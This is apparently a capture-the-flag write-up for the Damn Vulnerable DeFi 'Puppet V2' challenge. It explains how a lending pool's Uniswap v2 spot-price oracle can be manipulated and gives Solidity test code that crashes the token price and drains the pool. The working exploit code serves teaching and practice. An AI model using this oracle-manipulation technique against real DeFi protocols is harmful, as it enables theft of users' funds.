## [Puppet V2](https://www.damnvulnerabledefi.xyz/challenges/puppet-v2/)

> The developers of the [previous pool](https://damnvulnerabledefi.xyz/challenges/puppet/) seem to have learned the lesson. And released a new version.
>
> Now they’re using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. Shouldn’t that be enough?
>
> You start with 20 ETH and 10000 DVT tokens in balance. The pool has a million DVT tokens in balance at risk!
>
> Save all funds from the pool, depositing them into the designated recovery account.

```solidity
function _isSolved() private view {
    assertEq(token.balanceOf(address(lendingPool)), 0, "Lending pool still has tokens");
    assertEq(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
}
```

### Analysis

This challenge is basically the same as the [Puppet](https://www.damnvulnerabledefi.xyz/challenges/puppet/) challenge, except for the Oracle function. However, the pool still retrieves price information from Uniswap, which we can manipulate. Therefore, we can swap all of our DVT for WETH to cause the price of DVT to plummet, and then borrow DVT from the pool with minimal collateral.

```solidity
contract PuppetV2Pool {
  // [...]
  function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) {
    uint256 depositFactor = 3;
    return _getOracleQuote(tokenAmount) * depositFactor / 1 ether;
  }

  // Fetch the price from Uniswap v2 using the official libraries
  function _getOracleQuote(uint256 amount) private view returns (uint256) {
    (uint256 reservesWETH, uint256 reservesToken) =
        UniswapV2Library.getReserves({factory: _uniswapFactory, tokenA: address(_weth), tokenB: address(_token)});

    return UniswapV2Library.quote({amountA: amount * 10 ** 18, reserveA: reservesToken, reserveB: reservesWETH});
  }
}

```

### Solution
Full solution can be found in [PuppetV2.t.sol](./PuppetV2.t.sol#L101).
```solidity
function test_puppetV2() public checkSolvedByPlayer {
    /* function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
        ) external returns (uint[] memory amounts);
    */
    // swap all of player's tokens for WETH
    // https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02#swapexacttokensfortokens
    token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
    address[] memory path = new address[](2);
    path[0] = address(token);
    path[1] = address(weth);
    uniswapV2Router.swapExactTokensForTokens(PLAYER_INITIAL_TOKEN_BALANCE, 0, path, player, block.timestamp + 10000);

    // swap all of player's ETH for WETH
    weth.deposit{value: PLAYER_INITIAL_ETH_BALANCE}();

    // borrow all of the tokens from the pool
    weth.approve(address(lendingPool), type(uint256).max);
    lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
    token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
}
```
